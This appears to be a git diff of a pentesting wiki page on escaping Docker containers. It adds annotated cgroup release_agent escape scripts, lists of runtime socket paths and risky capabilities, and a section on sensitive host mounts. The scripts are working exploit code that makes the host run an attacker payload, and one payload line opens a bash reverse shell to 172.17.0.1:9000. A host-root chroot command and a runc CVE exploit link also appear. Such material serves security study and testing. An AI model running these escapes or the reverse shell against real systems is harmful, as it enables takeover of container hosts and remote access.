@@ -32,9 +32,22 @@ docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
 In case the **docker socket is in an unexpected place** you can still communicate with it using the **`docker`** command with the parameter **`-H unix:///path/to/docker.sock`**
 {% endhint %}
 
+Docker daemon might be also [listening in a port (by default 2375, 2376)](../../../pentesting/2375-pentesting-docker.md) or on Systemd-based systems, communication with the Docker daemon can occur over the Systemd socket `fd://`.
+
+{% hint style="info" %}
+Additionally, pay attention to the runtime sockets of other high-level runtimes:
+
+* dockershim: `unix:///var/run/dockershim.sock`
+* containerd: `unix:///run/containerd/containerd.sock`
+* cri-o: `unix:///var/run/crio/crio.sock`
+* frakti: `unix:///var/run/frakti.sock`
+* rktlet: `unix:///var/run/rktlet.sock`
+* ...
+{% endhint %}
+
 ## Capabilities Abuse Escape
 
-You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**
+You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
 You can check currently container capabilities using **previously mentioned automatic tools** or:
 
@@ -66,19 +79,6 @@ The `--privileged` flag introduces significant security concerns, and the exploi
 {% content-ref url="docker-privileged.md" %}
 [docker-privileged.md](docker-privileged.md)
 {% endcontent-ref %}
-
-In fact, `--privileged` **provides far more permissions** than needed to escape a docker container via this method. In reality, the “only” requirements are:
-
-1. We must be **running as root** inside the container
-2. The container must be run with the **`SYS_ADMIN` Linux capability**
-3. The container must lack an AppArmor profile, or otherwise allow the `mount` syscall
-4. The cgroup v1 virtual filesystem must be mounted read-write inside the container
-
-The `SYS_ADMIN` capability allows a container to perform the mount syscall (see [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [Docker starts containers with a restricted set of capabilities](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) by default and does not enable the `SYS_ADMIN` capability due to the security risks of doing so.
-
-Further, Docker [starts containers with the `docker-default` AppArmor](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) policy by default, which [prevents the use of the mount syscall](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) even when the container is run with `SYS_ADMIN`.
-
-A container would be vulnerable to this technique if run with the flags: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`
 
 ### Mounting Disk
 
@@ -129,14 +129,24 @@ debugfs /dev/sda1
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
 
+# Finds + enables a cgroup release_agent
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
+# Enables notify_on_release in the cgroup
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
+# Finds path of OverlayFS mount for container
+# Unless the configuration explicitly exposes the mount point of the host filesystem
+# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
 t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-touch /o;
-echo $t/c >$d/release_agent;
-echo "#!/bin/sh $1 >$t/o" >/c;
-chmod +x /c;
-sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
+# Sets release_agent to /path/payload
+touch /o; echo $t/c > $d/release_agent
+# Creates a payload
+echo "#!/bin/sh" > /c
+echo "ps > $t/o" >> /c
+chmod +x /c
+# Triggers the cgroup via empty cgroup.procs
+sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
+# Reads the output
+cat /o
 ```
 {% endcode %}
 
@@ -147,11 +157,21 @@ The following is a different version, more readable, of the previous script:
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
-# In the container
+# Mounts the RDMA cgroup controller and create a child cgroup
+# This technique should work with the majority of cgroup controllers
+# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
+# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
+# Enables cgroup notifications on release of the "x" cgroup
 echo 1 > /tmp/cgrp/x/notify_on_release
+
+# Finds path of OverlayFS mount for container
+# Unless the configuration explicitly exposes the mount point of the host filesystem
+# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+
+# Sets release_agent to /path/payload
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
 #For a normal PoC =================
@@ -165,8 +185,13 @@ echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
 chmod a+x /cmd
 #===================================
 
+# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
+# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
+# The script on the host will execute after /bin/sh exits 
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-head /output
+
+# Reads the output
+cat /output
 ```
 {% endcode %}
 
@@ -175,6 +200,19 @@ Find an **explanation of the technique** in:
 {% content-ref url="docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape.md" %}
 [docker-release\_agent-cgroups-escape.md](docker-breakout-privilege-escalation/docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
+
+&#x20;`--privileged` **provides far more permissions** than needed to escape a docker container via this method. In reality, the “only” requirements are:
+
+1. We must be **running as root** inside the container
+2. The container must be run with the **`SYS_ADMIN` Linux capability**
+3. The container must lack an AppArmor profile, or otherwise allow the `mount` syscall
+4. The cgroup v1 virtual filesystem must be mounted read-write inside the container
+
+The `SYS_ADMIN` capability allows a container to perform the mount syscall (see [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [Docker starts containers with a restricted set of capabilities](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) by default and does not enable the `SYS_ADMIN` capability due to the security risks of doing so.
+
+Further, Docker [starts containers with the `docker-default` AppArmor](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) policy by default, which [prevents the use of the mount syscall](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) even when the container is run with `SYS_ADMIN`.
+
+A container would be vulnerable to this technique if run with the flags: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`
 
 ### Abusing release\_agents without knowing relative path
 
@@ -285,6 +323,23 @@ Example:
 * [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 * [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
+### Sensitive Mounts
+
+There are several files that might mounted that give **information about the underlaying host**. Some of them may even indicate **something to be executed by the host when something happens** (which will allow a attacker to escape from the container).\
+The abuse of these files may allow that:
+
+* release\_agent (already covered before)
+* [binfmt\_misc](docker-breakout-privilege-escalation/sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
+* [core\_pattern](docker-breakout-privilege-escalation/sensitive-mounts.md#proc-sys-kernel-core\_pattern)
+* [uevent\_helper](docker-breakout-privilege-escalation/sensitive-mounts.md#sys-kernel-uevent\_helper)
+* [modprobe](docker-breakout-privilege-escalation/sensitive-mounts.md#proc-sys-kernel-modprobe)
+
+However, you can find **other sensitive files** to check for in this page:
+
+{% content-ref url="docker-breakout-privilege-escalation/sensitive-mounts.md" %}
+[sensitive-mounts.md](docker-breakout-privilege-escalation/sensitive-mounts.md)
+{% endcontent-ref %}
+
 ### Runc exploit (CVE-2019-5736)
 
 In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the _**/bin/sh**_ binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.
@@ -309,3 +364,4 @@ There are other CVEs the container can be vulnerable too
 * [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
 * [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
+* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
